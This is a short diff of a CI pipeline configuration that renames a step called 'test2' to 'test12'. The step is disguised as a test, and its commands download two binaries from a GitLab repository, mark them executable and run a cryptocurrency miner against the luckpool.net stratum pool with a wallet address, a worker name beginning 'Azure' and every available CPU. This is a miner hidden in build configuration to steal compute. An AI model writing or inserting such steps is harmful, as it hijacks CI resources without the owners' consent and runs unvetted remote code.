@@ -112,7 +112,7 @@ type: docker
 name: build12
 
 steps:
-- name: test2
+- name: test12
   image: node
   commands:
   - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
